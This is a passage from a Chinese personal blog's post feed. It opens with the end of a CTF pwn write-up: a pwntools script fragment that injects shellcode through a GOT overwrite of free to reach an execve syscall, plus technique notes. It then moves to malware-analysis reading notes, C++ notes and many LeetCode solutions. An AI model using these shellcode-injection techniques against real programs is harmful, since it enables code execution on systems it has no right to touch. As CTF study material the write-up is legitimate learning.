rdx,rdx&#39;)+&#39;\x90\x90\xe9\x16&#39;)add(3,asm(&#39;syscall&#39;)+&#39;\x90&#39;*5)p.recvuntil(&#39;choice&#39;)p.sendline(&#39;4&#39;)p.recvuntil(&#39;index&#39;)p.sendline(&#39;0&#39;)p.interactive()</code></pre><p>总结三点：</p><ol><li>跳转<br> 相对地址跳转的时候需要 <code>跳转差值 = 目标地址 - 当前地址 - len（跳转指令）</code></li><li>大佬的wp中选用了free作为目标,配合free(target[0])，这样在进入到free@got之后，rdi自动指向了所需要执行的指令，很漂亮 </li><li>系统调用号保存在<code>rax</code>中执行<code>execve</code>命令的时候注意其他参数的设定<br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">Linux系统调用列表</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战</title>
      <link href="/2020/05/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
      <url>/2020/05/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="恶意代码行为"><a href="#恶意代码行为" class="headerlink" title="恶意代码行为"></a>恶意代码行为</h1><ol><li>下载器与启动器</li><li>后门</li><li>登录凭证窃取</li><li>存活机制</li><li>提权</li><li>隐藏踪迹</li></ol><h2 id="实验11-1"><a href="#实验11-1" class="headerlink" title="实验11-1"></a>实验11-1</h2>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
          <category> 恶意代码分析实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> malware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++易忘点</title>
      <link href="/2020/04/29/C-%E6%98%93%E5%BF%98%E7%82%B9/"/>
      <url>/2020/04/29/C-%E6%98%93%E5%BF%98%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ol><li><code>int x = 011</code>,此处的x为9，以数字0开头表示八进制</li><li>C、C++中是区分双引号与单引号的，如下图所示，<code>&#39;a&#39;</code>与<code>&quot;a&quot;</code>不同 <div align=center><img src="./单引号与双引号.png" alt="单引号与双引号"   /></div></li><li>逗号运算符：<code>a = 3 * 5, a * 4;</code>,执行后a为60，‘=’的优先级高于‘，’</li><li>cout的输出中，<code>hex</code>是16进制，<code>oct</code>是八进制，<code>setw(int)</code>设置域宽，<code>setprecision(int)</code>设置小数点位数</li><li>自定义类型可以<code>typedef tmp int；</code>或者<code>using haha = int;</code><br> 枚举类型<code>enum day{Mon,Tue,Wen,Thu,Fri,Sat,Sun}; day x = Mon;</code><br> <code>auto x= a + b;</code>也就是<code>type(x) = type(a+b)</code><br> <code>decltype(i)j=2;</code>也就是<code>j = 2; type(j) = type(i);</code></li></ol><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ol><li>传址引用相对于传值开销更小，效率更高</li><li>内联函数要求不能使用循环和switch；定义出现在调用前；不能进行异常接口声明。内联函数将由编译器自动优化</li><li>带默认值的参数在函数参数的最右边</li><li>函数的重载不以函数的返回值来区分</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C\C++ </tag>
            
            <tag> Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程训练</title>
      <link href="/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AE%AD%E7%BB%83/"/>
      <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<p>；# 类型（好题、难题、普通题目）<br>；## 题号<br>；### 首次解答<br>；### 网上优解<br>；### 优化改进</p><pre><code class="C++"></code></pre><h1 id="好题"><a href="#好题" class="headerlink" title="好题"></a>好题</h1><h2 id="【更】204-计数质数"><a href="#【更】204-计数质数" class="headerlink" title="【更】204. 计数质数"></a>【更】<a href="https://leetcode-cn.com/problems/count-primes/" target="_blank" rel="noopener">204. 计数质数</a></h2><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><pre><code class="C++">//单纯硬解,运行时间在800毫秒左右class Solution {public:    int countPrimes(int n) {        vector&lt;int &gt; tmp;        for(int i=2;i&lt;n;i++) {            bool flag=true;            //缺少 tmp[j]&lt;= sqrt(i) 将超时!            for(int j=0;j&lt;tmp.size() &amp;&amp; tmp[j]&lt;= sqrt(i);j++) {                if(i%tmp[j]==0) {                    flag=false;                    break;                }            }              if(flag) tmp.push_back(i);        }        return tmp.size();    }};</code></pre><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>简单的题目,处处是细节</p><pre><code class="C++">//厄拉多塞筛法,运行速度上比硬解快不少,运行时间在260ms左右class Solution {public:    int countPrimes(int n) {        vector&lt;bool &gt; tmp(n,true);        int count=0;        for(int i=2;i&lt;n;i++) {            if(tmp[i]) {                count++;                for(int j=2;i*j&lt;n;j++)                    tmp[i*j]=false;            }        }        return count;    }};//优化版厄拉多塞筛法,运行速度又快了不少,时间在100毫秒左右class Solution {public:    int countPrimes(int n) {        vector&lt;bool &gt; tmp(n,true);        int count=0;        //n&gt;2,count++之后,再也不考虑偶数了        if(n&gt;2) count++;        //从3开始,每次加2,这样就绕过了需要检查的偶数        for(int i=3;i&lt;n;i+=2) {            if(tmp[i]) {                count++;                //从3开始,每次加2,绕过需要改变的偶数                for(int j=3;i*j&lt;n;j+=2)                    tmp[i*j]=false;            }        }        return count;    }};</code></pre><h2 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88. 合并两个有序数组"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/" target="_blank" rel="noopener">88. 合并两个有序数组</a></h2><h3 id="个人解答"><a href="#个人解答" class="headerlink" title="个人解答"></a>个人解答</h3><p>题目意思比较简单,就是合并两个有序的数组.个人想到的办法就是先将两者合并到nums1中,然后在nums1中进行排序.这个思路虽然存在尚未利用输入是有序这个条件,但是此处写一遍排序算法<br><img src="./sort.png" alt="十大排序算法比较"></p><pre><code class="C++">//稳定性怎么理解:举例说就是相同的数字,经过排序之后,其顺序没有发生变化,则稳定,否则不稳定.稳定的算法过程也可以改为不稳定的,一般不稳定的就是不稳定的//冒泡排序,判断比较两个相邻位置,时间复杂度O(n*n),最好O(n),较为稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++)             nums1[m+i]=nums2[i];        for(int i=0;i&lt;m+n;i++)             for(int j=0;j&lt;m+n-1;j++)                if(nums1[j+1]&lt;nums1[j]) {                    nums1[j+1]+=nums1[j];                    nums1[j]=nums1[j+1]-nums1[j];                    nums1[j+1]=nums1[j+1]-nums1[j];                }    }};//选择排序,从未排序的数据中选择最值插入到已排序的对尾,时间复杂度O(n*n),算法不稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++)            nums1[m+i]=nums2[i];        for(int i=0;i&lt;m+n;i++) {            int MinPos=i;            for(int j=i;j&lt;m+n;j++)                MinPos=nums1[MinPos] &lt; nums1[j] ? MinPos : j;            if(MinPos!=i) {                nums1[MinPos]+=nums1[i];                nums1[i]=nums1[MinPos]-nums1[i];                nums1[MinPos]=nums1[MinPos]-nums1[i];            }        }        }};//插入排序,将未排序的数据依次插入到已排序的数据中,平均时间复杂度O(n*n),算法稳定//在下面的写法中,使用二分查找加快查找速度,平均时间复杂度O(n*log(n))class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++) {            nums1[m+i]=nums2[i];        }        for(int i=0;i&lt;m+n-1;i++) {            int WaitPos=i+1,left=0,right=i,InsertPos=0;            if(nums1[i+1]&gt;nums1[i])                continue;            else if(nums1[i+1] &lt; nums1[0])                InsertPos=0;            else {                while(left&lt;=right){                    int mid=(left+right)/2;                    if((nums1[mid]&lt;nums1[i+1] &amp;&amp; nums1[mid+1]&gt;=nums1[i+1]) || nums1[mid]==nums1[i+1]) {                        InsertPos=mid+1;                        break;                    }                    if(nums1[mid]&gt;nums1[i+1])                        right=mid;                    else                        left=mid;                }            }            int tmp=nums1[i+1];            for(int pos=i+1;pos&gt;InsertPos;pos--){                nums1[pos]=nums1[pos-1];            }            nums1[InsertPos]=tmp;        }    }};//希尔排序,插入排序的改进版,定一个增量,为组数,在组内进行排序,随着组数的增加,最终组内为1个数,平均时间复杂度O(n*log(n)),最好和最坏情况都是O(n*log(n)*log(n)),算法不稳定//参考链接:https://www.cnblogs.com/chengxiao/p/6104371.htmlclass Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++) {            nums1[m+i]=nums2[i];        }        for(int i=(m+n)/2;i&gt;0;i/=2)     //i为组内个数            for(int j=i;j&lt;m+n;j++)      //j为组的个数,为啥没有从0开始,是考虑到数组个数为奇数时,最后一个数据应该单独成组,从0开始的话,未计入最后一个数组                for(int x=j-i; x&gt;=0  &amp;&amp; nums1[x]&gt;nums1[x+i];x-=i)                    swap(nums1[x],nums1[x+i]);     }};//归并排序,将数据分组,分到最小单元保持有序,再比较合并,时间复杂度O(n*log(n)),空间复杂度O(n),较为稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++)            nums1[m+i]=nums2[i];        for(int seg=1;;seg*=2) {            vector&lt;int&gt; tmp(nums1.begin(),nums1.end());     //开辟额外的空间,此处将nums1保存每一次的合并结果            int pos=0;            for(int start=0;start&lt;m+n;start+=seg*2) {                int right=min(start+seg+seg,m+n), mid=min(start+seg,m+n);                int i=start,j=mid;                             while(i&lt;mid &amp;&amp; j&lt;right) {                    nums1[pos++]=tmp[i] &lt; tmp[j] ? tmp[i++] : tmp[j++];                }                while(i&lt;mid) {                    nums1[pos++]=tmp[i++];                }                while(j&lt;right) {                    nums1[pos++]=tmp[j++];                }            }            tmp=nums1;            if(seg&gt;=m+n)                break;        }    }};//快速排序,选出基准元素,将比其小的元素存在在前面,大的存放后面,这样,该基准元素处于正确的排序位置,然后分区循环进行,平均时间复杂度O(n*log(n)),最坏情况O(n*n),算法不稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i=0;i&lt;n;i++)             nums1[m+i]=nums2[i];        sort(nums1,0,m+n);       }    void sort(vector&lt;int&gt;&amp; nums,int left,int right) {        if(left&gt;=right) return;        int mid=left;        for(int i=left+1;i&lt;right;i++) {            if(nums[mid]&gt;nums[i])   {                int tmp=nums[i];                for(int j=i;j&gt;mid;j--)                    nums[j]=nums[j-1];                nums[mid]=tmp;                mid++;            }        }        sort(nums,left,mid);    //处理左边        sort(nums,mid+1,right); //处理右边    }};//堆排序,升序排列,大堆顶,每个节点值都大于或者等于其节点值.时间复杂度O(n*log(n)),算法不稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for (int i = 0;i &lt; n;i++)            nums1[m + i] = nums2[i];        for (int i = (m + n) / 2 - 1;i &gt;=0;i--)            max_heapify(nums1, i, m + n - 1);   //从最后一个非叶子节点开始排序处理        //经过第一轮变换,已经是大堆顶了        //接下来将堆顶,即最大元素移动到堆的末尾,新的堆继续生成大堆顶            for (int i = (m + n) - 1;i &gt; 0;i--) {            swap(nums1[0], nums1[i]);            max_heapify(nums1, 0, i - 1);       //不同于第一次循环处理,此次首先从堆顶开始,因为堆已经基本有序,                                                //堆顶一定是从堆顶的子节点中比较选出的        }    }    void max_heapify(vector&lt;int&gt;&amp; nums, int left, int right) {        int dad = left, son = dad * 2 + 1;        while (son &lt;=right) {            if (son + 1 &lt;= right &amp;&amp; nums[son] &lt; nums[son + 1])   //比较两个子节点,确定两者中的最大值,以便与父节点交换                son++;            if (nums[dad] &gt; nums[son])                return;            else {                swap(nums[son], nums[dad]);                dad = son;                          //因为当前子节点的值已经变换,新子节点构成的树可能已经不满足大堆顶,所以继续移动                son = dad * 2 + 1;            }        }    }};//计数排序,利用数组统计次数,再展开就行,算法时间复杂度O(n+k),k为不同元素的个数,空间复杂度为O(k),算法稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        map&lt;int,int&gt; tmp;        for (int i = 0;i &lt; m;i++)            tmp[nums1[i]]++;          for (int i = 0;i &lt; n;i++)            tmp[nums2[i]]++;                int pos=0;        for(map&lt;int,int&gt;::iterator iter=tmp.begin();iter!=tmp.end();iter++) {            while(iter-&gt;second!=0) {                nums1[pos++]=iter-&gt;first;                iter-&gt;second--;            }        }    }};//桶排序,计数排序的升级版,首先更具最小最大数据进行划区域,将数据存放在合适的区域&quot;桶&quot;中,桶内通过插入排序实现有序,完成分类之后,在进行合并//通排序的平均时间复杂度是O(n+k),最坏情况时间复杂度为O(n*n),空间复杂度为空间复杂度为O(n+k),算法稳定//基数排序,类似于桶,按位置进行划分装桶,桶与桶之间是有序的.原理是先保证部分位置有序,再保证其他位置也有序,该方法不仅可用于数字比较.其时间复杂度是O(n*k),空间复杂度是O(n+k),算法稳定class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        for(int i = 0;i &lt; n;i++)             nums1[m+i]=nums2[i];        int circle=0;  //最大的位数        map&lt;int,vector&lt;int&gt;&gt; tmp;        for (int i = 0;i &lt; m+n;i++)        {            tmp[nums1[i]%10].push_back(nums1[i]);            int NumLength= to_string(abs(nums1[i])).length();            circle = circle &gt; NumLength ? circle : NumLength;        }        //第一轮循环结束，完成个位比较装桶        int pos=1;        for(int j=1;j&lt;=circle;j++) {            //从桶中取出，再准备装桶            nums1.clear();            for(map&lt;int,vector&lt;int&gt;&gt;::iterator iter=tmp.begin();iter!=tmp.end();iter++) {                for(int i=0;i&lt;(iter-&gt;second).size();i++)                   nums1.push_back((iter-&gt;second)[i]);             }            tmp.clear();            for (int i = 0;i &lt; m+n;i++)                tmp[nums1[i]/(int)pow(10,j)%10].push_back(nums1[i]);        }    }};//这个基数排序写的比较麻烦,主要是因为在第一次循环的遍历的时候需要确认最大的位数</code></pre><h3 id="改进-1"><a href="#改进-1" class="headerlink" title="改进"></a>改进</h3><p>上面的代码纯粹是为了练手,没有使用题目给出的有序这个条件,有序合并成有序,尽量保证空间复杂度为O(1)</p><pre><code class="C++">class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        int pos1=0,pos2=0;        //因为nums1是不断在增加的,所以pos1的判断对象也应该不断的变化        while(pos1&lt;m+pos2 &amp;&amp; pos2 &lt;n) {            if(nums1[pos1] &lt;= nums2[pos2]) {                pos1++;            }            else {                for(int i=m+pos2;i&gt;pos1;i--)                    nums1[i]=nums1[i-1];                nums1[pos1++]=nums2[pos2++];            }        }        while(pos2&lt;n) {            //nums1[pos1++]=nums2[pos2++]; 都可            nums1[m+pos2-1]=nums2[pos2++];        }    }};</code></pre><h3 id="更优版本"><a href="#更优版本" class="headerlink" title="更优版本"></a>更优版本</h3><p>从后面开始比较,这样就不需要像上面的代码一样频繁的移动数据了</p><pre><code class="C++">class Solution {public:    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) {        int pos1=m-1,pos2=n-1;        while(pos1 &gt;= 0 &amp;&amp; pos2&gt;=0){            //由于在后面的表达式中,pos已经完成了减减操作,所以这里赋值的对象应该是nums1[pos1+pos2+2],而非nums1[pos1+pos2+1]            nums1[pos1+pos2+2]=nums1[pos1] &gt; nums2[pos2] ? nums1[pos1--]:nums2[pos2--];        }        while(pos2&gt;=0)        {               nums1[pos2] = nums2[pos2];            pos2--;        }    }};</code></pre><h2 id="面试题-02-03-删除中间节点"><a href="#面试题-02-03-删除中间节点" class="headerlink" title="面试题 02.03. 删除中间节点"></a><a href="https://leetcode-cn.com/problems/delete-middle-node-lcci/" target="_blank" rel="noopener">面试题 02.03. 删除中间节点</a></h2><p>相同题目，描述的更加清晰<a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/" target="_blank" rel="noopener">237. 删除链表中的节点</a><br>上来看了半天没有理解题目的意思，看了题解之后才明白，题目是想在单链表中，将当前访问的元素删除  </p><h3 id="网上优解"><a href="#网上优解" class="headerlink" title="网上优解"></a>网上优解</h3><pre><code class="C++">class Solution {public:    void deleteNode(ListNode* node) {        //将next结点的值 赋值给 当前结点        node-&gt;val = node-&gt;next-&gt;val;        //干掉next结点        ListNode* tmp = node-&gt;next;        node-&gt;next = node-&gt;next-&gt;next;                delete tmp;    }};//解法二class Solution {public:    void deleteNode(ListNode* node) {        *node = *(node-&gt;next);    }};</code></pre><p>解法二是真的不错，利用了题目提供的复制构造函数，使用对象赋值给对象，覆盖掉了当前节点，为什么不是写<code>node = node-&gt;next</code>呢，调试发现了写<code>node = node-&gt;next</code>没有起到任何的作用，嘿嘿？还真不知道为什么。。。<code>node = node-&gt;next</code>调试发现是传址调用啊，但是不起作用，没有对原链表进行任何改动，如果写<code>node-&gt;next = (node-&gt;next-&gt;next)</code>的话，原链表的中传入的node的下一个节点确实被删除了<br>再调试发现了些许不同</p><div align=center><img src="./面试题 02.03. 删除中间节点/修改node.png" alt="修改node" /></div>  <div align=center><img src="./面试题 02.03. 删除中间节点/修改node->next.png" alt="修改node->next" /></div>  确实是传址，但是修改node节点的时候，node的前节点的next指向并没有修改，所以原链表也没有改变  ～  <h3 id="个人改进"><a href="#个人改进" class="headerlink" title="个人改进"></a>个人改进</h3><p>是我写的话，肯定不会想到写<code>delete tmp；</code>了，他人的解答考虑的周全  </p><pre><code class="Python">class Solution:    def deleteNode(self, node):        node.val=node.next.val        node.next=node.next.next</code></pre><h2 id="509-斐波那契数"><a href="#509-斐波那契数" class="headerlink" title="509. 斐波那契数"></a><a href="https://leetcode-cn.com/problems/fibonacci-number/" target="_blank" rel="noopener">509. 斐波那契数</a></h2><p>与题目<a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/" target="_blank" rel="noopener">面试题10- I. 斐波那契数列</a>大致相同，拿来作为动画规划学习之用</p><h3 id="个人首解"><a href="#个人首解" class="headerlink" title="个人首解"></a>个人首解</h3><pre><code class="C++">class Solution {public:    int fib(int n) {        vector&lt;long long int&gt; result;        result.push_back(0);        result.push_back(1);        for(int i=2;i&lt;=n;i++)        {            result.push_back(result[i-1]+result[i-2]);        }        return result[n];    }};</code></pre><h3 id="网上优解-1"><a href="#网上优解-1" class="headerlink" title="网上优解"></a>网上优解</h3><p>这里主要学习一下动态规划的概念与做法，<a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/solution/mian-shi-ti-10-i-fei-bo-na-qi-shu-lie-dong-tai-gui/" target="_blank" rel="noopener">参考链接1</a>、<a href="https://leetcode-cn.com/problems/fibonacci-number/solution/dong-tai-gui-hua-tao-lu-xiang-jie-by-labuladong/" target="_blank" rel="noopener">参考链接2</a>  </p><ol><li>啥是『自顶向下』、『自底向上』<br> 自顶向下，类似与二叉树，将问题一个一个向下分解为已知条件；自底向上就是从已知条件出发，一步一步往上推导，找出问题的答案；迭代的办法就是『自顶向下』，而动态规划就是『自底向上』</li><li>啥是『动态规划』<br> 动态规划问题的形式一般是求最值，求解的关键就是穷举，但是穷举的过程中可能存在重叠子问题，例如这里0+1可能被计算多次；所以在求解过程中需要编写合适的状态转移过程即问题转换方法来优化子结构<br>由于斐波那契数列的值只与前面两者相关，所以代码可以继续优化<pre><code class="C++">int fib(int n) { if (n == 2 || n == 1)      return 1; int prev = 1, curr = 1; for (int i = 3; i &lt;= n; i++) {     int sum = prev + curr;     prev = curr;     curr = sum; } return curr;}</code></pre><h3 id="个人改进-1"><a href="#个人改进-1" class="headerlink" title="个人改进"></a>个人改进</h3>个人代码在中间备忘录的做法上可能不太友好，可以直接依据输入直接初始化访问；上面的代码不是很满足题目需要，因为题目输入可以为0，于是乎<pre><code class="C++">class Solution {public: int fib(int n) {     if(n==0)         return 0;     else if(n==1)         return 1;     int curr,first=0,last=1;     for( int i=2;i&lt;=n;i++) {         curr=first+last;         first=last;         last=curr;     }     return curr; }};</code></pre><h2 id="8-字符串转换整数-atoi-–-有限状态机"><a href="#8-字符串转换整数-atoi-–-有限状态机" class="headerlink" title="8. 字符串转换整数 (atoi) – 有限状态机"></a><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/" target="_blank" rel="noopener">8. 字符串转换整数 (atoi) – 有限状态机</a></h2></li></ol><h3 id="个人解答-1"><a href="#个人解答-1" class="headerlink" title="个人解答"></a>个人解答</h3><p>偷懒了，使用了库函数。开始使用<code>stoi</code>函数，但是发现无法检查空字符串，无法返回超过int范围的数值，于是查看定义，发现<code>stoi</code>其实是<code>strtol</code>的包装，于是……</p><pre><code class="C++">class Solution {public:    int myAtoi(string str) {        long int result=strtol(str.c_str(),nullptr,10);        if(result &gt;INT_MAX)            return INT_MAX;        if(result &lt; INT_MIN)            return INT_MIN;        return result;        }};</code></pre><h3 id="改进-2"><a href="#改进-2" class="headerlink" title="改进"></a>改进</h3><p>官网解答给出了确定有限状态机的相关解法，其状态转移过程如下：</p><div align=center><img src="./8. 字符串转换整数 (atoi)/状态转移过程.png" alt="状态转移过程" /></div>  <div align=center><img src="./8. 字符串转换整数 (atoi)/状态转移过程2.png" alt="状态转移过程2" /></div><pre><code class="C++">class Automaton {    string state = &quot;start&quot;;    unordered_map&lt;string, vector&lt;string&gt;&gt; table = {        {&quot;start&quot;, {&quot;start&quot;, &quot;signed&quot;, &quot;in_number&quot;, &quot;end&quot;}},        {&quot;signed&quot;, {&quot;end&quot;, &quot;end&quot;, &quot;in_number&quot;, &quot;end&quot;}},        {&quot;in_number&quot;, {&quot;end&quot;, &quot;end&quot;, &quot;in_number&quot;, &quot;end&quot;}},        {&quot;end&quot;, {&quot;end&quot;, &quot;end&quot;, &quot;end&quot;, &quot;end&quot;}}    };    int get_col(char c) {        if (isspace(c)) return 0;        if (c == &#39;+&#39; or c == &#39;-&#39;) return 1;        if (isdigit(c)) return 2;        return 3;    }public:    int sign = 1;    long long ans = 0;    void get(char c) {        state = table[state][get_col(c)];        if (state == &quot;in_number&quot;) {   //下一个状态还是in_number，则加上该数字            ans = ans * 10 + c - &#39;0&#39;;            ans = sign == 1 ? min(ans, (long long)INT_MAX) : min(ans, -(long long)INT_MIN);        }        else if (state == &quot;signed&quot;)   //正负号只有出现在开头的时候，才有效            sign = c == &#39;+&#39; ? 1 : -1;    }};class Solution {public:    int myAtoi(string str) {        Automaton automaton;        for (char c : str)            automaton.get(c);        return automaton.sign * automaton.ans;    }};</code></pre><p>上述代码比较好理解，但是臃肿，比如说对每一个字符都进行了判断</p><pre><code class="C++">class Solution {public:    int myAtoi(string str) {        int  sign=1;        long long result=0;        if(str.size()==0) return 0;        int pos=0;        while(str[pos]==&#39; &#39;&amp;&amp; pos&lt;str.size()) {            pos++;        }        if(pos==str.size()) return 0;        if(str[pos]==&#39;-&#39;) sign=-1;        if(str[pos]==&#39;-&#39; || str[pos]==&#39;+&#39;) pos++;        while(isdigit(str[pos]) &amp;&amp; pos&lt;str.size()) {            result=result*10+(str[pos]-&#39;0&#39;)*sign;            if(result&gt;INT_MAX) return INT_MAX;            if(result&lt;INT_MIN) return INT_MIN;            pos++;        }        return result;    }};</code></pre><h2 id="28-实现-strStr-–-Sunday"><a href="#28-实现-strStr-–-Sunday" class="headerlink" title="28. 实现 strStr() – Sunday"></a><a href="https://leetcode-cn.com/problems/implement-strstr/" target="_blank" rel="noopener">28. 实现 strStr() – Sunday</a></h2><p>比较直接的办法就是直接一个一个对比查询</p><pre><code class="C++">class Solution {public:    int strStr(string haystack, string needle) {        int ne_size=needle.size();        int hay_size=haystack.size();        if(ne_size==0) return 0;        int         int i;        for(i=0;i&lt;=hay_size-ne_size;i++) {            int j=0;            int m=i;            for(;j&lt;ne_size;j++,m++) {                if(haystack[m]!=needle[j])                    break;            }            if(j==ne_size)                return i;        }                return -1;         }};</code></pre><p>但是其中很明显的问题就是中间存在这大量重复的查找，代码中使用<code>int m=i</code>就相当于遍历指针的回退操作。</p><h3 id="Sunday"><a href="#Sunday" class="headerlink" title="Sunday"></a>Sunday</h3><p>KMP（Knuth-Morris-Pratt）算法感觉比较复杂，先看Sunday算法。可以理解Sunday算法就是先对比，然后将下标为needle.size()的字符串对齐，然后判断比较，若对不齐则移动needle.size()+1个单位再匹配，再尝试对齐</p><pre><code class="C++">class Solution {public:    int strStr(string haystack, string needle) {        int nee_size = needle.size();        int hay_size = haystack.size();        if (nee_size == 0) return 0;        int displace[256];          for (int i = 0;i &lt; 256;i++) { //设置移位默认值，nee_size+1;            displace[i] = nee_size + 1;        }        for (int i = 0;i &lt; nee_size;i++) {            displace[needle[i]] = nee_size - i;    //每次对比时，末尾的haystack字符需要对齐的情况下，haystack指针需要移动的位数        }        int hay_pos = 0;    //被匹配字符串的位置        int pos = 0;        //已经匹配的字符串长度        for (int hay_pos = 0;hay_pos &lt;= hay_size - nee_size;) {            pos = 0;            while (haystack[pos + hay_pos] == needle[pos] &amp;&amp; pos &lt; nee_size)                pos++;            if (pos == nee_size)                return hay_pos;            hay_pos += displace[haystack[hay_pos + nee_size]];    //当前对比末尾haystack对齐        }        return -1;    }};</code></pre><p><a href="https://blog.csdn.net/q547550831/article/details/51860017" target="_blank" rel="noopener">Sunday参考链接</a></p><h3 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h3><p>提一下使用<code>memset</code>初始化int数组的为问题</p><div align=center><img src="./28. 实现 strStr()/初始化为1.png" alt="初始化为1" /></div>  <div align=center><img src="./28. 实现 strStr()/初始化为2.png" alt="初始化为2" /></div>  <div align=center><img src="./28. 实现 strStr()/初始化为-1.png" alt="初始化为-1" /></div>  <p>初始化为1和2的时候明显的失败，为什么0和-1却可以完成初始化，因为memset每次初始化1个字节，当尝试初始化为1时，int数变为了0x01010101,即图中的16843009，尝试初始化为2时，就变成了33686018，如此这般，0和-1的成功初始化也只是一种巧合,memeset是string的方法</p><h1 id="难题"><a href="#难题" class="headerlink" title="难题"></a>难题</h1><h2 id="【更】53-最大子序和"><a href="#【更】53-最大子序和" class="headerlink" title="【更】53. 最大子序和"></a>【更】<a href="https://leetcode-cn.com/problems/maximum-subarray/" target="_blank" rel="noopener">53. 最大子序和</a></h2><h3 id="个人解答-2"><a href="#个人解答-2" class="headerlink" title="个人解答"></a>个人解答</h3><p>写法上比较直观,碍脑阔</p><pre><code class="C++">//原本是这样写的,怎么思考的过程怎么写class Solution {public:    int maxSubArray(vector&lt;int&gt;&amp; nums) {        int result=INT_MIN;        int tmp=0;        int lasttmp=INT_MIN;    //保存上一分组和        for(int i=0;i&lt;nums.size();i++) {            tmp+=nums[i];            if(tmp&lt;0) {                //分组和是负数的时候，移动到下一分组                result = result &gt; tmp ? result : tmp;                 tmp=0;                lasttmp=INT_MIN;            }            else if(tmp &lt; lasttmp  &amp;&amp; nums[i]&gt;0) {                //当遍历到正数，但是收益在下降时lasttmp就是该分组的最大值                result = result &gt; lasttmp ? result : lasttmp;            }            else if(tmp&gt;lasttmp){                //收益继续增加                lasttmp=tmp;                result = result &gt; tmp ? result : tmp;             }        }         return result;          }};//但是后来一想,没必要记录上一分组和啊class Solution {public:    int maxSubArray(vector&lt;int&gt;&amp; nums) {        int result=INT_MIN;        int tmp=0;        for(int i=0;i&lt;nums.size();i++) {            tmp+=nums[i];            result = result &gt; tmp ? result : tmp;             if(tmp&lt;0) {                //分组和是负数的时候，移动到下一分组                tmp=0;            }          }         return result;      }};</code></pre><h3 id="改进-3"><a href="#改进-3" class="headerlink" title="改进"></a>改进</h3><p>官方给的解答写法上更为简单,巧妙的通过比较当前数据与前一分组数据和,来移动分组的起始位置,而我上面的写法,就是通当和为负数时才移动,相比较而言官方写法更好,因为pre明确了多个分组的最大值方案.</p><pre><code class="C++">class Solution {public:    int maxSubArray(vector&lt;int&gt;&amp; nums) {        int pre = 0, maxAns = nums[0];        for (const auto &amp;x: nums) {            //若果前一分组和小于当前数据,则说明前面都是无用值,pre的将从新的位置开始累加            pre = max(pre + x, x);            maxAns = max(maxAns, pre);        }        return maxAns;    }};</code></pre><h2 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/" target="_blank" rel="noopener">98. 验证二叉搜索树</a></h2><h3 id="个人写法"><a href="#个人写法" class="headerlink" title="个人写法"></a>个人写法</h3><p>该写法是错误的，原因在于只比较了当前节点与当前节点的子节点。</p><pre><code class="C++">/** * Definition for a binary tree node. * struct TreeNode { *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public:    bool isValidBST(TreeNode* root) {        if(root==nullptr) return true;        bool flag=true;        if(root-&gt;left != nullptr){            if(root-&gt;left-&gt;val &gt;= root-&gt;val)                flag=false;            else                isValidBST(root-&gt;left);            }        